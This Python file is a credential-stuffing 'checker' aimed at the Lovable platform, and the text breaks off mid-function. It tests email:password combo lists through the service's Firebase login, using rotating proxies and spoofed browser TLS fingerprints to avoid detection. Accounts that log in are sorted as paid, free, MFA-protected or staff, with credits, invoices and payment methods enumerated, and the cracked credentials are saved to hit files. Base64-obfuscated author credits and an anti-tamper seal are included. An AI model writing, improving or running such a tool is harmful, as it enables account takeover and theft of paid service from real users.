import os, re, sys, json, time, base64, random, string, hashlib
import threading, configparser, urllib3, urllib.parse
from datetime import datetime
from concurrent.futures import (ThreadPoolExecutor, as_completed,
                                 wait, FIRST_COMPLETED)

try:
    from curl_cffi import requests as cffi
    _HAVE_CFFI = True
except ImportError:
    import requests as cffi
    _HAVE_CFFI = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_F1T = "TG92YWJsZQ=="
_F2T = "IENoZWNrZXI="
_F1A = "QGV5ZWxp"
_F2A = "ZnRlcg=="
_F1C = "QGRhcmto"
_F2C = "dWNoYW5uZWw="
_F1D = "TE9WQUJMRUBleWVsaWZ0ZXI="
_F1S = "bG9ja2VkLWJ5LWV5"
_F2S = "ZWxpZnRlci0yMDI2"

_SEAL_PATH = os.path.join(os.path.expanduser("~"), ".eyelifter.lovable.seal")
_SEALED = None

FIREBASE_KEY = "AIzaSyBQNjlw9Vp4tP4VVeANzyPJnqbG2wLbYPw"
IDT = "https://identitytoolkit.googleapis.com/v1"
API = "https://api.lovable.dev"
WEB = "https://lovable.dev"


def _d(e):
    pad = "=" * (-len(e) % 4)
    return base64.b64decode(e + pad).decode("utf-8")


def _j(*p):
    return "".join(_d(x) for x in p)


TOOL     = _j(_F1T, _F2T)
TG_USER  = _j(_F1A, _F2A)
TG_CHAN  = _j(_F1C, _F2C)
RESULTS  = _j(_F1D)
SEAL_STR = _j(_F1S, _F2S)
LINE_TAG = f"by {TG_USER} | {TG_CHAN}"


def verify(ctx="x"):
    global _SEALED
    if _SEALED is True:
        return True
    if TOOL != "Lovable Checker":
        raise RuntimeError("eyelifter: credit stripped.")
    if TG_USER != "@samvir1" or TG_CHAN != "@samvir1":
        raise RuntimeError("eyelifter: credit stripped.")
    if RESULTS != "LOVABLE@samvir1":
        raise RuntimeError("eyelifter: credit stripped.")
    if SEAL_STR != "locked-by-eyelifter-2026":
        raise RuntimeError("eyelifter: credit stripped.")
    try:
        fp = hashlib.sha256(open(__file__, "rb").read()).hexdigest()[:32]
    except Exception:
        fp = "x"
    if os.path.isfile(_SEAL_PATH):
        try:
            st = open(_SEAL_PATH).read().strip()
        except OSError:
            st = ""
        if st and st != fp:
            raise RuntimeError("eyelifter: hands off. this build is sealed.")
    else:
        try:
            open(_SEAL_PATH, "w").write(fp)
        except OSError:
            pass
    _SEALED = True
    return True


_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def color(c, s, b=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if b else ''}{c}m{s}{_RS}"


_LV = {"SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
       "ERROR": ("31", True), "STEP": ("96", True), "DEBUG": ("35", False)}

_KIND_COLOR = {
    "paid":           ("92", True),
    "staff":          ("92", True),
    "free":           ("96", False),
    "paid_exhausted": ("96", False),
    "oauth":          ("93", False),
    "mfa":            ("95", True),
    "exhausted":      ("90", False),
    "bad":            ("31", False),
    "error":          ("31", True),
}

_CL = threading.Lock()


def log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    code, bold = _LV.get(level, ("0", False))
    with _CL:
        if _ANSI:
            print(f"{color('90', ts)} {emoji}  "
                  f"{color(code, f'{level:7s}', bold)}  "
                  f"{color('90', tag)}  {msg}", flush=True)
        else:
            print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)


def rline(i, t, kind, txt):
    code, bold = _KIND_COLOR.get(kind, ("0", False))
    with _CL:
        if _ANSI:
            prefix = color("90", f"[{i:02d}/{t}]")
            body = color(code, txt, bold)
            print(f"{prefix} {body}", flush=True)
        else:
            print(f"[{i:02d}/{t}] {txt}", flush=True)


def section(t, w=68):
    print()
    lbl = f" {t} "
    side = max(1, (w - len(lbl)) // 2)
    print(color("90", "─" * side) + color("96", lbl, True)
          + color("90", "─" * (w - len(lbl) - side)))


def banner(t, sub=None, w=68):
    print()
    line = "═" if _ANSI else "="
    print(color("90", line * w))
    print(color("96", t.center(w), True))
    if sub:
        print(color("2", sub.center(w)))
    print(color("5", f"eyelifter · {TG_USER} · {TG_CHAN}".center(w)))
    print(color("90", line * w))


def summary(rows):
    print()
    print(color("96", f"═══ eyelifter · {TG_USER} · {TG_CHAN} ═══", True))
    if rows:
        wk = max(len(str(k)) for k, _ in rows)
        for k, v in rows:
            print(f"  {color('96', str(k).ljust(wk))}  {color('0', str(v))}")
    print(color("96", "════════════════════════════════", True))


def human_time(iso):
    if not iso:
        return None
    try:
        s = str(iso).strip().replace("Z", "+00:00")
        dt = datetime.fromisoformat(s)
        dt_local = dt.astimezone()
        tz = dt_local.tzname() or "UTC"
        return dt_local.strftime(f"%b %d, %Y · %H:%M:%S {tz}")
    except Exception:
        return str(iso)


def human_time_long(iso=None):
    try:
        if iso is None:
            dt = datetime.now().astimezone()
        elif isinstance(iso, datetime):
            dt = iso.astimezone() if iso.tzinfo else iso
        else:
            s = str(iso).strip().replace("Z", "+00:00")
            dt = datetime.fromisoformat(s).astimezone()
        tz = dt.tzname() or "UTC"
        return dt.strftime(f"%B %d, %Y · %H:%M:%S {tz}")
    except Exception:
        return str(iso)


CFG_PATH = os.path.join(
    os.environ.get("LOVABLE_HOME") or os.path.dirname(os.path.abspath(__file__)),
    "config_lovable.ini"
)
MAX_THREADS = 100


class Cfg:
    def __init__(self, cf=CFG_PATH):
        self.cf = cf
        self.cp = configparser.ConfigParser()
        self.cp.optionxform = str
        self.s = self._inmemory()
        try:
            self.load()
        except Exception as e:
            sys.stderr.write(f"[lovable] config load failed, using defaults: {e}\n")

    @staticmethod
    def _inmemory():
        return {
            "threads": 5,
            "timeout": 30,
            "proxies_file": "proxies.txt",
            "retries": 2,
            "retry_delay": 1.5,
            "combo_delay": 0.8,
            "rate_limit_delay": 60,
            "skip_proxy_test": False,
            "open_channel_on_launch": True,
            "debug": False,
            "hit_spacer": True,
            "deep_enrich": True,
            "staff_probe": True,
            "impersonate": "chrome",
            "fp_rotate": "session",
            "fp_pool": "",
            "fp_jitter": True,
        }

    def load(self):
        if not os.path.exists(self.cf):
            try:
                self._default()
            except Exception:
                pass
        try:
            self.cp.read(self.cf, encoding="utf-8")
        except Exception:
            try:
                self._default()
                self.cp.read(self.cf, encoding="utf-8")
            except Exception:
                return
        if "lovable" not in self.cp:
            self.cp["lovable"] = {}
        c = self.cp["lovable"]
        try:
            self.s["threads"] = max(1, min(MAX_THREADS, c.getint("threads", 5)))
        except (ValueError, TypeError):
            self.s["threads"] = 5
        try:
            self.s["timeout"] = max(5, min(120, c.getint("timeout", 30)))
        except (ValueError, TypeError):
            self.s["timeout"] = 30
        self.s["proxies_file"] = c.get("proxies_file", "proxies.txt")
        try:
            self.s["retries"] = max(0, min(5, c.getint("retries", 2)))
        except (ValueError, TypeError):
            self.s["retries"] = 2
        try:
            self.s["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1.5)))
        except (ValueError, TypeError):
            self.s["retry_delay"] = 1.5
        try:
            self.s["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.8)))
        except (ValueError, TypeError):
            self.s["combo_delay"] = 0.8
        try:
            self.s["rate_limit_delay"] = max(1, min(300, c.getint("rate_limit_delay", 60)))
        except (ValueError, TypeError):
            self.s["rate_limit_delay"] = 60
        self.s["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.s["open_channel_on_launch"] = c.getboolean("open_channel_on_launch", True)
        self.s["debug"] = c.getboolean("debug", False)
        self.s["hit_spacer"] = c.getboolean("hit_spacer", True)
        self.s["deep_enrich"] = c.getboolean("deep_enrich", True)
        self.s["staff_probe"] = c.getboolean("staff_probe", True)
        self.s["impersonate"] = c.get("impersonate", "chrome")
        self.s["fp_rotate"] = c.get("fp_rotate", "session").strip().lower()
        if self.s["fp_rotate"] not in ("session", "attempt", "fixed"):
            self.s["fp_rotate"] = "session"
        self.s["fp_pool"] = c.get("fp_pool", "")
        self.s["fp_jitter"] = c.getboolean("fp_jitter", True)

    def _default(self):
        self.cp["lovable"] = {
            "threads": "5", "timeout": "30", "proxies_file": "proxies.txt",
            "retries": "2", "retry_delay": "1.5", "combo_delay": "0.8",
            "rate_limit_delay": "60", "skip_proxy_test": "false",
            "open_channel_on_launch": "true", "debug": "false",
            "hit_spacer": "true", "deep_enrich": "true",
            "staff_probe": "true", "impersonate": "chrome",
            "fp_rotate": "session", "fp_pool": "", "fp_jitter": "true",
        }
        try:
            with open(self.cf, "w", encoding="utf-8") as f:
                self.cp.write(f)
        except OSError:
            pass

    def save(self):
        if "lovable" not in self.cp:
            self.cp["lovable"] = {}
        for k, v in self.s.items():
            self.cp["lovable"][k] = str(v)
        with open(self.cf, "w", encoding="utf-8") as f:
            self.cp.write(f)


_CFG = Cfg()

_FP_LOCK = threading.Lock()
_FP_CURRENT = None
_FP_USED = []
_FP_HITS = 0
_FP_WARM = {}


def _fp_targets():
    raw = (_CFG.s.get("fp_pool") or "").strip()
    names = [n.strip() for n in raw.split(",") if n.strip()] if raw else []
    if not names:
        names = ["chrome"]
    return names

def _fp_kind(imp):
    n = str(imp).lower()
    if n.startswith("edge"):
        return "edge"
    if "safari" in n:
        return "ios" if n.endswith("_ios") else "safari"
    if n.startswith("firefox") or n.startswith("tor"):
        return "firefox"
    if "android" in n or n.endswith("_ios"):
        return "android"
    return "chrome"


def _known_targets():
    try:
        from curl_cffi.requests.impersonate import BrowserType
        return {str(getattr(v, "value", v)) for v in BrowserType}
    except Exception:
        return set()


def _warm_ok(imp):
    if imp in _FP_WARM:
        return _FP_WARM[imp]
    ok = imp in _known_targets() or imp in ("chrome", "edge", "safari", "firefox")
    if ok and _HAVE_CFFI:
        try:
            s = cffi.Session(impersonate=imp, timeout=6)
            s.verify = False
            s.close()
        except Exception:
            ok = False
    _FP_WARM[imp] = ok
    return ok


def pick_fp(force_new=False, peek=False):
    global _FP_CURRENT, _FP_USED, _FP_HITS
    mode = (_CFG.s.get("fp_rotate") or "session").strip().lower()
    with _FP_LOCK:
        if _FP_CURRENT is not None and not force_new and not peek:
            if mode == "fixed":
                return _FP_CURRENT
            if mode == "attempt" and _FP_HITS <= 1:
                _FP_HITS += 1
                return _FP_CURRENT
        pool = [t for t in _fp_targets() if _warm_ok(t)]
        if not pool:
            pool = ["chrome"]
        if len(pool) > 1 and _FP_USED:
            pool = [t for t in pool if t != _FP_USED[-1]] or pool
        imp = random.choice(pool)
        kind = _fp_kind(imp)
        headers = {
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        }
        extra = None
        if (_CFG.s.get("fp_jitter") and _HAVE_CFFI
                and kind in ("chrome", "edge", "android")):
            try:
                extra = {"tls_grease": random.choice([True, False]),
                         "http2_no_priority": random.choice([True, False])}
            except Exception:
                extra = None
        fp = {"imp": imp, "kind": kind, "headers": headers, "extra_fp": extra}
        if not peek:
            _FP_CURRENT = fp
            _FP_USED.append(imp)
            if len(_FP_USED) > 40:
                _FP_USED.pop(0)
            _FP_HITS = 1
        return fp


def rotate_fp():
    with _FP_LOCK:
        global _FP_CURRENT, _FP_HITS
        _FP_CURRENT = None
        _FP_HITS = 0


def reset_fp_cycle():
    global _FP_CURRENT, _FP_USED, _FP_HITS
    with _FP_LOCK:
        _FP_CURRENT = None
        _FP_USED = []
        _FP_HITS = 0


_LK = threading.Lock()
_PK = threading.Lock()
_FK = threading.Lock()
_IK = threading.Lock()
_RL = threading.Lock()
_DBG_LOCK = threading.Lock()
_STOP = threading.Event()

_ST = {"checked": 0, "paid": 0, "paid_exhausted": 0, "free": 0, "oauth": 0,
       "mfa": 0, "staff": 0, "exhausted": 0, "bad": 0, "rl": 0,
       "errors": 0, "pfails": 0}
_START = time.time()
_TOTAL = 0
_POOL = []
_BADP = set()
_COOLP = {}
_INUSE = set()
_RLU = 0.0
_FOLDER = None
_DBG_DIR = None
_HANDLES = {}


def reset_stats():
    global _ST, _START, _COOLP, _BADP, _RLU
    with _LK:
        _ST = {"checked": 0, "paid": 0, "paid_exhausted": 0, "free": 0,
               "oauth": 0, "mfa": 0, "staff": 0, "exhausted": 0, "bad": 0,
               "rl": 0, "errors": 0, "pfails": 0}
        _START = time.time()
    with _PK:
        _COOLP = {}
        _BADP = set()
    with _RL:
        _RLU = 0.0
    with _IK:
        _INUSE.clear()
    reset_fp_cycle()


def pick_proxy(exclude=None):
    now = time.time()
    with _PK:
        avail = [p for p in _POOL
                 if p not in _BADP and _COOLP.get(p, 0.0) <= now]
    with _IK:
        free = [p for p in avail if p not in _INUSE]
    if not free:
        free = avail
    if exclude and len(free) > 1:
        free = [p for p in free if p != exclude] or free
    p = random.choice(free) if free else None
    if p:
        with _IK:
            _INUSE.add(p)
    return p


def rel_proxy(p):
    if not p:
        return
    with _IK:
        _INUSE.discard(p)


def bad_proxy(p):
    if not p:
        return
    with _PK:
        if p in _BADP:
            return
        _BADP.add(p)
    with _LK:
        _ST["pfails"] += 1


def cool_proxy(p, secs=120):
    if not p:
        return
    with _PK:
        _COOLP[p] = time.time() + secs


def rl_backoff(s):
    global _RLU
    with _RL:
        _RLU = max(_RLU, time.time() + s)


def rl_wait():
    while not _STOP.is_set():
        with _RL:
            gap = _RLU - time.time()
        if gap <= 0:
            return
        if _STOP.wait(min(gap, 1.0)):
            return


def sw(fh, text):
    if fh is None:
        return
    with _FK:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def parse_proxy(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return line
    p = line.split(":")
    if len(p) == 4:
        return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    if len(p) == 2:
        return f"http://{p[0]}:{p[1]}"
    if "@" in line:
        return f"http://{line}"
    return None


def load_proxies(path):
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            p = parse_proxy(ln)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def test_proxy(p):
    try:
        fp = pick_fp(peek=True)
        kw = {"proxies": {"http": p, "https": p}, "timeout": 8,
              "headers": fp["headers"]}
        if _HAVE_CFFI:
            kw["impersonate"] = fp["imp"]
            if fp.get("extra_fp"):
                kw["extra_fp"] = fp["extra_fp"]
        else:
            kw["verify"] = False
        r = cffi.get("https://api.ipify.org?format=json", **kw)
        return r.status_code == 200
    except Exception:
        return False


def filter_proxies(proxies):
    if not proxies:
        return []
    total = len(proxies)
    good, done = [], [0]
    lock = threading.Lock()
    log("🌐", "STEP", "PROXY", f"testing {total}")

    def probe(p):
        ok = test_proxy(p)
        with lock:
            done[0] += 1
            if ok:
                good.append(p)
            if done[0] % 20 == 0 or done[0] == total:
                log("🔎", "STEP", "PROXY",
                    f"{done[0]}/{total} — {len(good)} live")

    with ThreadPoolExecutor(max_workers=min(60, max(1, total))) as ex:
        for f in as_completed([ex.submit(probe, p) for p in proxies]):
            try:
                f.result()
            except Exception:
                pass
    if not good:
        log("⚠️", "WARN", "PROXY", f"0/{total} live — running direct")
        return []
    log("✅", "INFO", "PROXY", f"{len(good)}/{total} live")
    return good


def folder():
    global _FOLDER, _DBG_DIR
    if _FOLDER:
        return _FOLDER
    root = os.path.join(os.path.dirname(CFG_PATH), RESULTS)
    os.makedirs(root, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _FOLDER = os.path.join(root, f"Session_{ts}_{tag}")
    os.makedirs(_FOLDER, exist_ok=True)
    _DBG_DIR = os.path.join(_FOLDER, "Debug")
    os.makedirs(_DBG_DIR, exist_ok=True)
    return _FOLDER


def save_dbg(name, text):
    if not _CFG.s.get("debug", False):
        return
    folder()
    safe = re.sub(r"[^A-Za-z0-9._-]", "_", name)[:150]
    with _DBG_LOCK:
        try:
            with open(os.path.join(_DBG_DIR, f"{safe}.txt"), "w",
                      encoding="utf-8", errors="replace") as f:
                f.write((text or "")[:500_000])
        except Exception:
            pass


def build_session(proxy=None, fp=None):
    fp = fp or pick_fp()
    to = _CFG.s["timeout"]
    imp = fp["imp"]
    s = None
    if _HAVE_CFFI:
        try:
            kw = {"impersonate": imp, "timeout": to}
            if fp.get("extra_fp"):
                kw["extra_fp"] = fp["extra_fp"]
            s = cffi.Session(**kw)
        except Exception:
            try:
                s = cffi.Session(impersonate="chrome", timeout=to)
            except Exception:
                s = cffi.Session(timeout=to)
    else:
        s = cffi.Session()
    s.verify = False
    s.headers.update(fp["headers"])
    s.headers["accept"] = "application/json, text/plain, */*"
    s.headers["content-type"] = "application/json"
    s.headers["origin"] = WEB
    s.headers["referer"] = f"{WEB}/"
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def _api_headers(extra=None):
    h = {
        "accept": "application/json, text/plain, */*",
        "origin": WEB,
        "referer": f"{WEB}/",
        "x-client-git-sha": "84e4dc18c4c3ea81f4db3792727ac2e32b77521c",
        "x-lov-platform": ('{"platform":"web","version":'
                           '"84e4dc18c4c3ea81f4db3792727ac2e32b77521c",'
                           '"clientCapabilities":["visual_explanation_v1"]}'),
    }
    if extra:
        h.update(extra)
    return h


def pre_check(s, email):
    try:
        r = s.post(f"{API}/auth/check-auth-provider",
                   json={"email": email},
                   headers=_api_headers(),
                   timeout=_CFG.s["timeout"])
    except Exception as e:
        return None, f"net_{type(e).__name__}"
    save_dbg(f"precheck_{email}", r.text)
    if r.status_code == 429:
        return None, "pre_429"
    if r.status_code != 200:
        return None, f"pre_{r.status_code}"
    try:
        j = r.json()
    except Exception:
        return None, "pre_non_json"
    return {
        "user_exists": j.get("user_exists"),
        "providers": j.get("providers") or [],
        "require_sso": j.get("require_sso"),
    }, None


def firebase_signin(s, email, password):
    try:
        r = s.post(f"{IDT}/accounts:signInWithPassword",
                   params={"key": FIREBASE_KEY},
                   json={"returnSecureToken": True,
                         "email": email, "password": password,
                         "clientType": "CLIENT_TYPE_WEB"},
                   headers=_api_headers(),
                   timeout=_CFG.s["timeout"])
    except Exception as e:
        return None, f"net_{type(e).__name__}"
    save_dbg(f"firebase_{email}", r.text)
    try:
        j = r.json()
    except Exception:
        return None, "non_json"
    if r.status_code == 200:
        return j, None
    err = ((j.get("error") or {}).get("message") or "unknown")
    return None, err


def classify_fb_error(msg):
    m = (msg or "").upper()
    if any(k in m for k in ("INVALID_LOGIN_CREDENTIALS", "INVALID_PASSWORD",
                            "EMAIL_NOT_FOUND", "USER_NOT_FOUND")):
        return "bad", "wrong_creds"
    if "USER_DISABLED" in m:
        return "exhausted", "disabled"
    if "TOO_MANY_ATTEMPTS" in m:
        return "error", "rate_limit"
    if "PASSWORD_LOGIN_DISABLED" in m:
        return "exhausted", "password_disabled"
    if "BLOCKING_FUNCTION_ERROR_RESPONSE" in m:
        return "error", "blocked"
    if "MFA_REQUIRED" in m or "SECOND_FACTOR" in m or "TWO_FACTOR" in m:
        return "mfa", "mfa_required"
    return "error", "fb_" + (msg or "")[:40]


def detect_mfa(fb):
    if not isinstance(fb, dict):
        return None
    if not fb.get("mfaPendingCredential"):
        return None
    info = fb.get("mfaInfo") or []
    factors = []
    for m in info:
        if not isinstance(m, dict):
            continue
        phone = m.get("phoneInfo")
        kind = "phone" if phone else "totp"
        factors.append({
            "kind": kind,
            "display": m.get("displayName") or (
                "SMS" if phone else "Authenticator App"),
            "phone": phone,
        })
    return {
        "uid": fb.get("localId"),
        "factors": factors,
        "pending": fb.get("mfaPendingCredential"),
    }


def api_get(s, id_token, path, timeout=None):
    try:
        r = s.get(f"{API}{path}",
                  headers=_api_headers({"authorization": f"Bearer {id_token}"}),
                  timeout=timeout or _CFG.s["timeout"])
        return r
    except Exception:
        return None


def get_workspaces(s, id_token, email=""):
    r = api_get(s, id_token, "/user/workspaces")
    if r is None:
        return None, "net"
    save_dbg(f"workspaces_{email or 'unknown'}", r.text)
    if r.status_code == 200:
        try:
            return r.json(), None
        except Exception:
            return None, "ws_non_json"
    if r.status_code == 401:
        return None, "token_invalid"
    if r.status_code == 429:
        return None, "ws_429"
    return None, f"ws_{r.status_code}"


def get_profile(s, id_token):
    r = api_get(s, id_token, "/profile/@me")
    if r is None:
        return None
    if r.status_code == 200:
        try:
            return r.json()
        except Exception:
            return None
    return None


def get_json(s, id_token, path):
    r = api_get(s, id_token, path)
    if r is None:
        return None
    if r.status_code != 200:
        return None
    try:
        return r.json()
    except Exception:
        return None


def probe_staff(s, id_token):
    r = api_get(s, id_token, "/admin/has-tailscale")
    if r is None:
        return None
    if r.status_code == 200:
        return True
    if r.status_code == 403:
        return False
    return None


class Result:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.status = "unknown"
        self.reason = ""
        self.uid = None
        self.username = None
        self.display_name = None
        self.avatar = None
        self.workspace_id = None
        self.workspace_name = None
        self.plan = None
        self.role = None
        self.joined = None
        self.credits = None
        self.credits_granted = None
        self.daily_remaining = None
        self.daily_limit = None
        self.cloud_remaining = None
        self.ai_remaining = None
        self.connectors_remaining = None
        self.chat_remaining = None
        self.chat_limit = None
        self.out_of_cloud = False
        self.out_of_build = False
        self.out_of_chat = False
        self.credits_frozen = False
        self.num_projects = 0
        self.referral_code = None
        self.referral_count = 0
        self.monthly_usage = 0
        self.builder_count = None
        self.has_invoice = False
        self.has_payment_method = False
        self.has_contract = False
        self.has_sso = False
        self.has_auto_topup = False
        self.is_staff = None
        self.providers = []
        self.mfa_factors = []


def check_account(combo, proxy=None):
    if ":" not in combo:
        r = Result(combo, "")
        r.status = "bad"
        r.reason = "malformed"
        return r
    email, password = combo.split(":", 1)
    email = email.strip().lower()
    password = password.strip()
    r = Result(email, password)

    fp = pick_fp(force_new=(_CFG.s.get("fp_rotate") == "attempt"))
    s = build_session(proxy, fp)

    try:
        pre, pre_err = pre_check(s, email)
        if pre:
            r.providers = pre.get("providers") or []
            if pre.get("user_exists") is False:
                r.status = "bad"
                r.reason = "no_account"
                return r
            if pre.get("require_sso"):
                r.status = "oauth"
                r.reason = "sso_required"
                return r
            if pre.get("providers") and "password" not in pre["providers"]:
                r.status = "oauth"
                r.reason = "oauth_only:" + ",".join(pre["providers"])
                return r
        elif pre_err == "pre_429":
            r.status = "error"
            r.reason = "rate_limit"
            return r

        fb, err = firebase_signin(s, email, password)
        if fb is None:
            st, reason = classify_fb_error(err)
            r.status = st
            r.reason = reason
            return r

        mfa = detect_mfa(fb)
        if mfa:
            r.status = "mfa"
            r.uid = mfa["uid"]
            r.mfa_factors = mfa["factors"]
            kinds = [f["kind"] for f in mfa["factors"]]
            r.reason = "mfa:" + (",".join(kinds) if kinds else "totp")
            return r

        id_token = fb.get("idToken")
        r.uid = fb.get("localId")

        ws_data, ws_err = get_workspaces(s, id_token, email=email)
        if ws_data is None:
            if ws_err == "token_invalid":
                r.status = "oauth"
                r.reason = "api_token_rejected"
                return r
            if ws_err == "ws_429":
                r.status = "error"
                r.reason = "ws_429"
                return r
            r.status = "error"
            r.reason = ws_err or "no_workspaces"
            return r
        ws_list = ws_data.get("workspaces") or []
        if not ws_list:
            r.status = "error"
            r.reason = "empty_workspaces"
            return r

        ws = ws_list[0]
        r.workspace_id = ws.get("id")
        r.workspace_name = ws.get("name")
        r.plan = (ws.get("plan") or "unknown").lower()
        r.role = (ws.get("membership") or {}).get("role")
        r.joined = ws.get("created_at")
        r.num_projects = ws.get("num_projects", 0)
        r.referral_count = ws.get("referral_count", 0)
        r.referral_code = ws.get("short_referral_code")

        prof = get_profile(s, id_token)
        if prof:
            r.username = prof.get("username")
            r.avatar = prof.get("avatar_url")
            attrs = prof.get("attributes") or {}
            r.display_name = attrs.get("display_name")

        cb = get_json(s, id_token, f"/workspaces/{r.workspace_id}/credit-balance")
        if cb:
            r.credits = cb.get("total_remaining")
            r.credits_granted = cb.get("total_granted")
            r.daily_remaining = cb.get("daily_remaining")
            r.daily_limit = cb.get("daily_limit")
            r.cloud_remaining = cb.get("cloud_remaining")
            r.ai_remaining = cb.get("ai_remaining")
            r.connectors_remaining = cb.get("connectors_remaining")
            ca = cb.get("chat_allowance") or {}
            r.chat_remaining = ca.get("remaining")
            r.chat_limit = ca.get("limit")
            r.out_of_cloud = bool(cb.get("out_of_cloud_credits"))
            r.out_of_build = bool(cb.get("out_of_build_credits"))
            r.out_of_chat = bool(cb.get("out_of_chat_credits"))
            r.credits_frozen = bool(cb.get("plan_credits_frozen"))

        um = get_json(s, id_token,
                      f"/workspaces/{r.workspace_id}/user-monthly-usage")
        if um:
            r.monthly_usage = um.get("user_monthly_usage", 0)

        if _CFG.s.get("staff_probe", True):
            r.is_staff = probe_staff(s, id_token)

        paid = (r.plan or "").lower() not in ("free", "inactive", "")
        if _CFG.s.get("deep_enrich", True) and (paid or r.is_staff is True):
            wid = r.workspace_id
            bc = get_json(s, id_token, f"/workspaces/{wid}/builder-count")
            if bc:
                r.builder_count = bc.get("builder_count")

            inv = get_json(s, id_token, f"/workspaces/{wid}/invoices")
            if isinstance(inv, dict):
                items = inv.get("invoices") or inv.get("data") or []
                r.has_invoice = len(items) > 0

            pm = get_json(s, id_token, f"/workspaces/{wid}/payment-methods")
            if isinstance(pm, dict):
                pms = pm.get("payment_methods") or pm.get("data") or []
                r.has_payment_method = len(pms) > 0

            cs = get_json(s, id_token, f"/workspaces/{wid}/contract-summary")
            if isinstance(cs, dict):
                r.has_contract = bool(cs.get("contract_id") or cs.get("id")
                                     or cs.get("status"))

            sso = get_json(s, id_token, f"/workspaces/{wid}/sso-providers")
            if isinstance(sso, dict):
                provs = sso.get("providers") or sso.get("sso_providers") or []
                r.has_sso = len(provs) > 0

            at = get_json(s, id_token, f"/workspaces/{wid}/auto-topup/status")
            if isinstance(at, dict):
                r.has_auto_topup = bool(at.get("enabled"))

        r.status = "hit"
        return r
    finally:
        try:
            s.close()
        except Exception:
            pass


_FREE = {"free", "inactive", ""}
_PAID_EXACT = {
    "pro", "pro_legacy", "legacy", "biz", "lite", "starter", "launch",
    "ambassador", "ktlo", "enterprise", "enterprise_self_serve",
    "partner", "model_partner",
}
_PAID_PREFIX = ("teams_", "scale")


def is_paid_plan(plan):
    if not plan:
        return False
    p = str(plan).lower().strip()
    if p in _FREE:
        return False
    if p in _PAID_EXACT:
        return True
    if any(p.startswith(x) for x in _PAID_PREFIX):
        return True
    if re.match(r"^(pro|biz|ktlo|scale|teams|legacy|enterprise|partner)_\d+$", p):
        return True
    return True


PLAN_DISPLAY = {
    "free": "Free", "inactive": "Inactive", "pro": "Pro",
    "pro_legacy": "Legacy Pro", "legacy": "Legacy", "biz": "Business",
    "lite": "Lite", "starter": "Starter", "launch": "Launch",
    "ambassador": "Ambassador", "ktlo": "KTLO",
    "enterprise": "Enterprise",
    "enterprise_self_serve": "Enterprise (Self-Serve)",
    "partner": "Partner", "model_partner": "Model Partner",
}

_PLAN_PREFIX_NAME = {
    "pro": "Pro",
    "biz": "Business",
    "ktlo": "KTLO",
    "scale": "Scale",
    "teams": "Teams",
    "legacy": "Legacy",
    "enterprise": "Enterprise",
    "partner": "Partner",
}


def plan_label(plan):
    if not plan:
        return "-"
    p = str(plan).lower().strip()
    if p in PLAN_DISPLAY:
        return PLAN_DISPLAY[p]
    m = re.match(r"^(pro|biz|ktlo|scale|teams|legacy|enterprise|partner)_(\d+)$", p)
    if m:
        return f"{_PLAN_PREFIX_NAME[m.group(1)]} {m.group(2)}"
    if p.startswith("scale") and "_" in p:
        return f"Scale {p.split('_')[1]}"
    return plan.title()


def classify(r):
    if r.status == "bad":
        return "bad"
    if r.status == "oauth":
        return "oauth"
    if r.status == "mfa":
        return "mfa"
    if r.status == "exhausted":
        return "exhausted"
    if r.status != "hit":
        return "error"
    if r.is_staff is True:
        return "staff"
    if r.out_of_cloud or r.out_of_build or r.out_of_chat or r.credits_frozen:
        return "paid_exhausted" if is_paid_plan(r.plan) else "exhausted"
    if is_paid_plan(r.plan):
        return "paid"
    return "free"


def open_files(d):
    hdr = (
        f"# Lovable Checker by eyelifter — started {human_time_long()}\n"
        f"# Credit: eyelifter | {TG_USER} | {TG_CHAN}\n"
        f"# Seal: {SEAL_STR}\n"
        f"\n"
    )
    names = {
        "paid":           "lovable_paid.txt",
        "paid_exhausted": "lovable_paid_exhausted.txt",
        "free":           "lovable_free.txt",
        "oauth":          "lovable_oauth_only.txt",
        "mfa":            "lovable_mfa.txt",
        "staff":          "lovable_staff.txt",
        "exhausted":      "lovable_exhausted.txt",
        "bad":            "lovable_bad.txt",
        "error":          "lovable_errors.txt",
        "json":           "lovable_hits_full.jsonl",
    }
    handles = {}
    for k, n in names.items():
        fh = open(os.path.join(d, n), "w", encoding="utf-8")
        if k != "json":
            fh.write(hdr)
        handles[k] = fh
    return handles


def fmt_line(r):
    def _v(x):
        if x is None or x == "":
            return "-"
        return str(x)

    parts = [
        f"{r.email}:{r.password}",
        f"uid={_v(r.uid)}",
        f"user={_v(r.username)}",
        f"name={_v(r.display_name)}",
        f"plan={_v(plan_label(r.plan) if r.plan else None)}",
        f"role={_v(r.role)}",
        f"ws={_v(r.workspace_id)}",
        f"joined={_v((r.joined or '')[:10])}",
        f"credits={_v(r.credits)}/{_v(r.credits_granted)}",
        f"daily={_v(r.daily_remaining)}/{_v(r.daily_limit)}",
        f"cloud={_v(r.cloud_remaining)}",
        f"ai={_v(r.ai_remaining)}",
        f"connectors={_v(r.connectors_remaining)}",
        f"chat={_v(r.chat_remaining)}/{_v(r.chat_limit)}",
        f"proj={_v(r.num_projects)}",
        f"refs={_v(r.referral_count)}",
        f"refcode={_v(r.referral_code)}",
        f"usage={_v(r.monthly_usage)}",
        f"builder={_v(r.builder_count)}",
        f"invoice={_v(r.has_invoice)}",
        f"card={_v(r.has_payment_method)}",
